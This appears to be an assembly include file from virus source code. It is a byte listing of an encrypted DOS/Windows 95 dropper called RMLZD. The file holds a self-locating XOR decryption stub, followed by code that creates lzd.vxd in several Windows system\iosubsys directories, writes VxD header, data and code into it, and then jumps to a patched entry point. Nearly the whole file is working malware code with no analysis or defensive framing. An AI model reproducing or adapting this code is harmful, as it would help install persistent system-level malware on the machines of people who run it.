   ;---[RMLZD.INC]---------------------------------------------------------------

   ;Modified db listing of rmlzd.com

   start:
   db 0E8h, 000h, 000h, 05Eh, 081h, 0EEh, 003h, 001h
   db 056h, 05Dh, 01Eh, 00Eh, 01Fh, 0B0h
   ;db 000h
   encval db 0
   db 08Dh
   db 0BEh, 021h, 001h, 0B9h, 08Eh, 007h, 0EBh, 005h
   db 047h, 0E2h, 0FBh, 0EBh, 004h, 030h, 005h, 0EBh
   db 0F7h
   encstart:
   db 0B8h, 000h, 03Dh, 08Dh, 096h, 0C6h, 001h
   db 0CDh, 021h, 073h, 07Fh, 0B4h, 03Ch, 033h, 0C9h
   db 0CDh, 021h, 073h, 026h, 0B8h, 000h, 03Dh, 08Dh
   db 096h, 0E9h, 001h, 0CDh, 021h, 073h, 06Ch, 0B4h
   db 03Ch, 033h, 0C9h, 0CDh, 021h, 073h, 013h, 0B8h
   db 000h, 03Dh, 08Dh, 096h, 00Ah, 002h, 0CDh, 021h
   db 073h, 059h, 0B4h, 03Ch, 033h, 0C9h, 0CDh, 021h
   db 072h, 055h, 093h, 0B4h, 040h, 0B9h, 0BDh, 002h
   db 08Dh, 096h, 031h, 002h, 0CDh, 021h, 0B9h, 048h
   db 00Dh, 051h, 0B4h, 040h, 0B9h, 001h, 000h, 08Dh
   db 096h, 0C5h, 001h, 0CDh, 021h, 059h, 0E2h, 0F1h
   db 0B4h, 040h, 0B9h, 051h, 000h, 08Dh, 096h, 0EEh
   db 004h, 0CDh, 021h, 0B4h, 040h, 0B9h, 031h, 001h
   db 08Dh, 096h, 000h, 001h, 0CDh, 021h, 0B9h, 0C4h
   db 006h, 051h, 0B4h, 040h, 0B9h, 001h, 000h, 08Dh
   db 096h, 0C5h, 001h, 0CDh, 021h, 059h, 0E2h, 0F1h
   db 0B4h, 040h, 0B9h, 070h, 003h, 08Dh, 096h, 03Fh
   db 005h, 0CDh, 021h, 0B4h, 03Eh, 0CDh, 021h, 058h
   db 005h, 011h, 000h, 048h, 001h, 086h, 0C3h, 001h
   db 005h
   ;db 0F0h, 0FFh
   sseg dw 0fff0h  ;not necessary
   db 08Eh, 0D0h, 0BCh
   ;db 0FEh, 0FFh
   ssp dw 0fffeh
   db 0EAh
   ;db 000h, 000h, 0F0h, 0FFh
   csip dd 0fff00000h
   db 000h
   ;db 063h, 03Ah
   ;db 05Ch, 077h, 069h, 06Eh, 064h, 06Fh, 077h, 073h
   ;db 05Ch, 073h, 079h, 073h, 074h, 065h, 06Dh, 05Ch
   ;db 069h, 06Fh, 073h, 075h, 062h, 073h, 079h, 073h
   ;db 05Ch, 06Ch, 07Ah, 064h, 02Eh, 076h, 078h, 064h
   ;db 000h, 063h, 03Ah, 05Ch, 077h, 069h, 06Eh, 039h
   ;db 035h, 05Ch, 073h, 079h, 073h, 074h, 065h, 06Dh
   ;db 05Ch, 069h, 06Fh, 073h, 075h, 062h, 073h, 079h
   ;db 073h, 05Ch, 06Ch, 07Ah, 064h, 02Eh, 076h, 078h
   ;db 064h, 000h, 063h, 03Ah, 05Ch, 077h, 069h, 06Eh
   ;db 064h, 06Fh, 077h, 073h, 02Eh, 030h, 030h, 030h
   ;db 05Ch, 073h, 079h, 073h, 074h, 065h, 06Dh, 05Ch
   ;db 069h, 06Fh, 073h, 075h, 062h, 073h, 079h, 073h
   ;db 05Ch, 06Ch, 07Ah, 064h, 02Eh, 076h, 078h, 064h
   ;db 000h
   dropname1 db 'c:\windows\system\iosubsys\lzd.vxd',0
   dropname2 db 'c:\win95\system\iosubsys\lzd.vxd',0
   dropname3 db 'c:\windows.000\system\iosubsys\lzd.vxd',0
   vxdheader db vxdhsize dup (?)
   vxddata db vxddsize dup (?)
   vxdcode db vxdcsize dup (?)
   encend:
   vend:
